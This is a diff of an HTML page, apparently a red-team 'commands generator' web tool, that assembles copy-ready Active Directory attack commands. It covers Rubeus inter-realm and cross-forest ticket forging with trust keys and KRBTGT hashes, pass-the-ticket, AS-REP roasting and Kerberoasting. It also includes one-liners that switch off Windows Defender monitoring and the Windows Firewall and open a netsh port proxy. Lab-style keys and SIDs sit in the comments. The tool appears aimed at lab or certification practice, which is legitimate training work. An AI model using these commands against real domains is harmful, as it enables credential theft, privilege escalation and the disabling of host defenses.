@@ -3,7 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Command Generator</title>
+    <title>Rouge Ops</title>
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Red Teaming Commands Generator">
+    <meta name="keywords" content="Red Teaming, Commands, Generator, red team cheatsheet">
+    <!-- Social Media Meta Tags -->
+    <meta property="og:title" content="Rouge Ops">
+    <meta property="og:description" content="Red Teaming Commands Generator">
+    <meta property="og:url" content="https://kickass101.github.io">
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="style.css">
@@ -15,6 +22,8 @@
         <h1 class="mb-4 text-center">Red Teaming Commands Generator</h1>
         <!-- Global Inputs -->
         <h2 class="mt-4">Global Values</h2>
+        <pre class="text-info">Fill the values below once to use across many commmands. Refresh page</pre>
+        <pre class="text-info">Provide FQDNs for domains</pre>
         <form id="form-global">
             <div class="form-group">
                 <label for="current-domain">Current Domain:</label>
@@ -33,20 +42,18 @@
                 <input type="text" class="form-control" id="parent-sid" name="ticket" required>
             </div>
             <div class="form-group">
-                <label for="krbtgt">KRB RC4:</label>
+                <label for="krbtgt">KRBTGT RC4:</label>
                 <input type="text" class="form-control" id="krbtgt" name="rc4" required>
             </div>
             <div class="form-group">
                 <label for="tools-path">Tools Path:</label>
-                <input type="text" class="form-control" id="tools-path" name="tools-path" required>
+                <input type="text" class="form-control" id="tools-path" name="tools-path" placeholder="C:\AD\Tools\">
             </div>
         </form>
         
-        <pre class="text-info">Provide FQDNs for domains</pre>
-        
         <!-- Tabs -->
         <ul class="nav nav-tabs">
-            <!-- <li><a class="nav-link" data-toggle="tab" href="#nav-cross-forest">Cross Forest</a></li> -->
+            <li><a class="nav-link" data-toggle="tab" href="#nav-cross-forest">Cross Forest</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-inter-forest">Inter Forest</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-kerberor-tickets">Kerberos Tickets</a></li>
             <li><a class="nav-link" data-toggle="tab" href="#nav-kerberoast">Roasting</a></li>
@@ -57,59 +64,101 @@
         
         <!-- Tab Content -->
         <div class="tab-content mt-4" id="nav-tabContent">
-            <!-- Cross Forest
-                <div class="tab-pane fade" id="nav-cross-forest" role="tabpanel" aria-labelledby="nav-cross-forest-tab">
-                    <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
-                        <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
-                        </label>
-                        <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
-                        </label>
-                        <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Mimikatz.exe"> Mimikatz
-                        </label>
-                        <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Rubeus.exe"> Rubeus
-                        </label>
-                        <label class="btn btn-outline-dark btn-secondary">
-                            <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Invoke-Mimikatz"> Invoke-Mimikatz
-                        </label>
+            <div class="tab-pane fade" id="nav-cross-forest" role="tabpanel" aria-labelledby="nav-cross-forest-tab">
+                <pre class="text-info">Only Rubeus, for now</pre>
+                <!-- <div class="btn-group mb-3 sticky-top" role="group" id="tool-buttons" data-toggle="buttons">
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Safetykatz.exe"> Safetykatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="BetterSafetykatz.exe"> BetterSafetykatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Mimikatz.exe"> Mimikatz
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Rubeus.exe"> Rubeus
+                    </label>
+                    <label class="btn btn-outline-dark btn-secondary">
+                        <input id="tool-btn" type="radio" name="tool" autocomplete="off" data-tool="Invoke-Mimikatz"> Invoke-Mimikatz
+                    </label>
+                </div> -->
+                
+                <!-- Inter relam TGT -->
+                <!-- C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:4b3d9c78a58e13dba8366da47a490c00dfacbfe0d5b82a710fb463ca3238a093 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap -->
+                <form id="form-cross-tgt">
+                    <h3>Inter Relam TGT</h3>
+                    <div class="form-group">
+                        <label for="trust-ntlm">Trust Key (NTLM):</label>
+                        <input type="text" class="form-control" id="trust-ntlm" name="t-ntlm" required>
                     </div>
-                    
-                    
-                    Trust Key
-                    <form>
-                        <div class="form-group">
-                            <label for="trust-ntlm">Trust Key (NTLM):</label>
-                            <input type="text" class="form-control" id="trust-ntlm" name="t-ntlm" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="user">User:</label>
-                            <input type="text" value="Administrator" class="form-control" id="user" name="user" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="target-domain">Target Domain:</label>
-                            <input type="text" class="form-control" id="target-domain" name="target-domain" required>
-                        </div>
-                        <div class="form-group">
-                            <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
-                        </div>
-                    </form>
-                    <div class="card bg-dark">
-                        <div class="card-body">
-                            <div class="input-group mb-5">
-                                <input id="command-cross-forest" type="text" class="form-control">
-                                <div class="input-group-append">
-                                    <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
-                                        <i class="fas fa-copy"></i> Copy
-                                    </button>
-                                </div>
+                    <div class="form-group">
+                        <label for="trust-aes">Trust Key (AES256):</label>
+                        <input type="text" class="form-control" id="trust-aes" name="aes256" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="user">User:</label>
+                        <input type="text" value="Administrator" class="form-control" id="user" name="user" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="current-domain">Current Domain:</label>
+                        <input type="text" class="form-control" id="current-domain" name="current-domain" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Current Domain SID</label>
+                        <input type="text" class="form-control" id="current-sid" name="current-sid" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>
+                </form>
+                <div class="card bg-dark  mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-cross-tgt" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
                             </div>
                         </div>
                     </div>
                 </div>
-            -->
+                
+                <!-- Get TGS from Across Forest -->
+                <!-- C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: -->
+                <form id="form-cross-tgs">
+                    <h3>TGS from across forest</h3>
+                    <div class="form-group">
+                        <label for="service">Service SPN: (Ex: cifs/eurocorp-dc.eurocorp.LOCAL)</label>
+                        <input type="text" class="form-control" id="service" name="service" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dc">Domain Controller: (Ex: eurocorp-dc.eurocorp.LOCAL)</label>
+                        <input type="text" class="form-control" id="dc" name="dc" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="ticket">Ticket file Path (.kirbi) or value:</label>
+                        <input type="text" class="form-control" id="ticket" name="ticket" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" id="generate-command" type="submit">Generate Command</button>
+                    </div>
+                </form>
+                <div class="card bg-dark  mb-5">
+                    <div class="card-body">
+                        <div class="input-group">
+                            <input id="command-cross-tgs" type="text" class="form-control">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
             
             <!-- Inter Forest -->
             <div class="tab-pane fade" id="nav-inter-forest" role="tabpanel" aria-labelledby="nav-inter-forest-tab">
@@ -377,6 +426,10 @@
                         <input type="text" class="form-control" id="aes256" name="aes256" required>
                     </div>
                     <div class="form-group">
+                        <label for="rc4">KRB NTLM:</label>
+                        <input type="text" class="form-control" id="rc4" name="rc4" required>
+                    </div>
+                    <div class="form-group">
                         <label for="startoffset">startoffset:</label>
                         <input type="text" class="form-control" id="startoffset" name="startoffset" value="0">
                     </div>
@@ -467,12 +520,13 @@
             <!-- Kerberoast -->
             <div class="tab-pane fade" id="nav-kerberoast" role="tabpanel" aria-labelledby="nav-kerberoast-tab">
                 <pre class="text-info">Default hash format is: John the Ripper</pre>
-                <!-- Kerberoast -->
-                <!-- Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt -->
-                <h3>Kerberoast</h3>
-                <form id="form-kerberoast">
+                <!-- Asreproast -->
+                <h3>AsReproast</h3>
+                <form id="form-asreproast">
                     <div class="form-group">
-                        <label for="user">User (samaccountname):</label>
+                        <label for="user"  data-toggle="tooltip" data-placement="top" title="(Get-DomainUser -PreauthNotRequired).samaccountname">
+                            User (samaccountname):
+                        </label>
                         <input type="text" class="form-control" id="user" name="user" required>
                     </div>
                     <div class="form-group">
@@ -486,7 +540,7 @@
                 <div class="card bg-dark mb-5">
                     <div class="card-body">
                         <div class="input-group">
-                            <input id="command-kerberoast" type="text" class="form-control">
+                            <input id="command-asreproast" type="text" class="form-control">
                             <div class="input-group-append">
                                 <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
@@ -495,12 +549,14 @@
                         </div>
                     </div>
                 </div>
-                <!-- AsRepRoast -->
-                <!-- rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /format:hashcat -->
-                <h3>AsRepRoast</h3>
-                <form id="form-asreproast">
+                
+                <!-- Kerberoast -->
+                <h3>Kerberoast</h3>
+                <form id="form-kerberoast">
                     <div class="form-group">
-                        <label for="user">SPN: (Ex: ldap/dc1.ignite.local/ignite.local)</label>
+                        <label for="user" data-toggle="tooltip" data-placement="top" title="Get-DomainUser | ? servicePrincipalName | select name,servicePrincipalName">
+                            SPN: (Ex: ldap/dc1.ignite.local/ignite.local)
+                        </label>
                         <input type="text" class="form-control" id="spn" name="spn" required>
                     </div>
                     <div class="form-group">
@@ -514,7 +570,7 @@
                 <div class="card bg-dark mb-5">
                     <div class="card-body">
                         <div class="input-group">
-                            <input id="command-asreproast" type="text" class="form-control">
+                            <input id="command-kerberoast" type="text" class="form-control">
                             <div class="input-group-append">
                                 <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
                                     <i class="fas fa-copy"></i> Copy
@@ -621,26 +677,47 @@
                 
                 <form>
                     <div class="form-group mb-5">
-                        <label for="">Disable Widows Defender:</label>
-                        <input type="text" value="Set-MpPreference -DisableIOAVProtection $true -Verbose; Set-MpPreference -DisableRealtimeMonitoring $true -Verbose" class="form-control" id="ps-script" name="psc-script">
+                        <h4 for="">Disable Widows Defender:</h4>
+                        <div class="input-group">
+                            <input type="text" value="Set-MpPreference -DisableIOAVProtection $true -Verbose; Set-MpPreference -DisableRealtimeMonitoring $true -Verbose" class="form-control" id="ps-script" name="psc-script">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
                     </div>
                     <div class="form-group mb-5">
-                        <label for="">Disable Windows Firewall:</label>
-                        <input type="text" value="netsh advfirewall set currentprofile state off" class="form-control" id="ps-script" name="psc-script">
+                        <h4 for="">Disable Windows Firewall:</h4>
+                        <div class="input-group">
+                            <input type="text" value="netsh advfirewall set currentprofile state off" class="form-control" id="ps-script" name="psc-script">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
                     </div>
                     <div class="form-group">
-                        <label>Port Forwarding</label>
-                        <input type="text" value='$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=' class="form-control" id="ps-script" name="psc-script">
-                    </div>
-                </form>
-            </div>
+                        <h4>Port Forwarding</h4>
+                        <pre class="text-info">Append your machine IP at the end</pre>
+                        <div class="input-group">
+                            <input type="text" value='netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=' class="form-control" id="ps-script" name="psc-script">
+                            <div class="input-group-append">
+                                <button class="btn btn-primary" type="button" onclick="copyToClipboard(this)">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                
+                
+                <!-- Bootstrap JS (optional) -->
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+                <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
+                <!-- Custom JavaScript -->
+                <script src="script.js"></script>
+            </body>
+            </html>
             
-            
-            <!-- Bootstrap JS (optional) -->
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-            <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
-            <!-- Custom JavaScript -->
-            <script src="script.js"></script>
-        </body>
-        </html>
-        
